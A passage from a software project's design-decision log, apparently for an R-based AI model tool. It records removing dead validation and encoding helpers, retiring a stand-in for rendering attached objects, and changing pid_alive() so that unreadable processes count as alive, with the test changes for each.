   elsewhere is not detected on Windows. `file.info()` of such a link warns on Windows; the marker
   already records it, so the warning is suppressed and no R condition leaves the exec (D-106).

Validation: `progress/ci-hosted.md`, Task CI-6.

## D-138 - P01 dead code: msg_validate(), locale_utf8() and its warning class, truncate_output(id_prefix =) go (2026-10-05)
- Rule: one content-block predicate, `block_ok(b, types)` (provider-message.R), checks queue attachments
  (queue_blocks_check()) and tool results (tool_result_check()); `msg_validate()` (no caller) goes.
- Contract-visible: 04 section 4.2 drops `msg_validate(msg)`; section 2.2 drops the never-signalled
  `locale` warning; section 7.1 drops `locale_utf8()`, `truncate_output(id_prefix =)` (no caller passed
  it) and `spill_write()`'s default prefix (`spill_write(text, prefix)` writes `<prefix>.txt`; P22
  already passes a full stem). P18's Interfaces and P22's Consumes lines follow.
- Tests: test-provider-message.R: 3 msg_validate tests and the json_rename test removed;
  test-utils-encoding.R: the locale_utf8 test and the emulated-R-4.2.3 pass removed;
  test-utils-text.R: the spill_write id-append expectation dropped; test-session-object.R,
  test-provider-fake.R: msg_validate oracles retargeted to block_ok. Evidence: progress/simplicity.md P01-D.

## D-139 - P07 drops the expired one-line `attached` stand-in (2026-10-05)
- Rule: attached objects render only through P09's `attached` context block (`builtin:workspace`);
  P07's stand-in for "until P09 registers the attached block" (05 P07 scope and acceptance row 6) is
  gone, since P09 has landed. Row 6 stays proven by test-env-snapshot.R (IC-38).
- Contract-visible: none (05's transitional clause expired). Behaviour differs only when
  `builtin:workspace` is replaced or disabled without an `attached` block: no attached rendering.
- Tests: test-prompt-cache.R (1) and test-prompt-context.R (2) always-skipped stub tests removed.
  Evidence: progress/simplicity.md P07-S.

## D-141 - P04 pid_alive() reads an unreadable process as alive (2026-10-05)
- Rule: `pid_alive(pid, create_time)` is a valid pid and `!isFALSE(proc_identity(pid,
  create_time)$alive)`: an OS error other than confirmed absence, or an unreadable creation time,
  now reads alive (was dead), so session, document and settings locks stay held (simplicity plan
  section 3, P04-S10). Confirmed absence, zombies and a creation-time mismatch read dead (IC-59).
- Contract-visible: none (04 section 7.4 defines no unknown state).
- Tests: test-proc-supervise.R OS-error block (+1 expectation). Evidence: progress/simplicity.md P04-S.
